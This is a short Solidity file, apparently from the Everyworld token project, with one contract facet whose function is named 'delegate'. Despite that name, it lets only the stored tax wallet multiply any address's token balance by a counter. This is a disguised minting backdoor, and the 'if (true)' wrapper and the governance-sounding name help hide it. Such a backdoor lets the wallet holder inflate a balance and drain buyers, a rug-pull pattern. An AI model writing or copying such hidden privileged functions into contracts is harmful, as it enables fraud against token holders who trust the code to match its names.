// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.everyworld.com/
    Twitter:  https://twitter.com/joineveryworld
    Youtube:  https://www.youtube.com/@JoinEveryworld
    Telegram: https://t.me/joineveryworld
    Discord:  http://discord.gg/everyworld

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
